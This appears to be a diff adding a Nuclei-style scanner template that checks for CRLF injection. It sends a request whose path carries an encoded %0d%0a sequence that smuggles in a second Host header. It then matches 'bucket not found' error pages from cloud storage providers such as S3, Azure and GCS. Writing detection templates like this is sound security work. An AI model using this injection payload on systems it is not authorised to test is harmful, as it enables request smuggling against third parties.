@@ -1,0 +1,37 @@
+id: xcrlf_bucket
+info:
+  name: xcrlf_bucket
+  author: raff
+  severity: high
+  description: xcrlf
+
+http:
+  - raw:
+      - |
+        GET /HTTP11Hostnon-exisblablating-bucket1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /%20HTTP/1.1%0d%0aHost:%20non-exisblablating-bucket1%0d%0a%0d%0a HTTP/1.1
+        Host: {{Hostname}}
+    req-condition: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          # Amazon S3
+          # IBM Cloud Object Storage
+          # Alibaba Cloud Object Storage Service
+          # Wasabi
+          # DigitalOcean Spaces
+          # Oracle Cloud Infrastructure Object Storage
+          # MinIO
+          - 'contains(body_2, "NoSuchBucket") && contains(body_2, "The specified bucket does not exist") && !contains(body_1, "NoSuchBucket") && !contains(body_1, "The specified bucket does not exist")'
+          # Microsoft Azure Blob Storage
+          - 'contains(body_2, "ContainerNotFound") && contains(body_2, "The specified container does not exist") && !contains(body_1, "ContainerNotFound") && !contains(body_1, "The specified container does not exist")'
+          # Google Cloud Storage
+          - 'contains(body_2, "Not Found. The specified bucket does not exist") && contains(body_2, "RESOURCE_NOT_FOUND") && !contains(body_1, "Not Found. The specified bucket does not exist") && !contains(body_1, "RESOURCE_NOT_FOUND")'
+          # Backblaze B2 Cloud Storage
+          - 'contains(body_2, "not_found") && contains(body_2, "Bucket not found") && !contains(body_1, "not_found") && !contains(body_1, "Bucket not found")'
+          
+        condition: or
